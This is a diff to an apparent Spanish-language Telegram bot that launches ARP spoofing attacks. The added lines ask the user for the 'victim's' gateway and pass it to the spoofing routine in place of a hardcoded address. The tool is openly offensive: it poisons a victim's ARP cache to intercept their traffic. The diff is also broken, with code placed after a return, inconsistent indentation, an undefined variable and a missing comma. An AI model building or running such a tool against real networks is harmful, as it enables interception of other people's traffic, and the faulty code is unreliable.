@@ -9,6 +9,9 @@ a = 1
 
 IP = range(1)
 
+GATEWAY = range(1)
+
+
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)
 
@@ -38,6 +41,13 @@ def attack(update, context):
     )
 
     return IP
+  
+  update.message.reply_text(
+        '¿Cuál es la Gateway de su víctima? (Escriba "/cancel" para cancelar la petición)',
+        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
+    )
+  
+    return GATEWAY
 
 def set_ip(update, context):
 
@@ -46,7 +56,7 @@ def set_ip(update, context):
     logger.info(f'ARP spoofing iniciado para {ip}')
 
     target_ip = ip
-    gateway_ip = "192.168.1.1"
+    gateway_ip = gateway
 
     try:
         target_mac = ARP().hwsrc
@@ -79,6 +89,7 @@ conv_handler = ConversationHandler(
     states={
       
         IP: [MessageHandler(None, set_ip)]
+        GATEWAY: [MessageHandler(None, set_ip)]
     },
   
     fallbacks=[MessageHandler(None, cancel)]
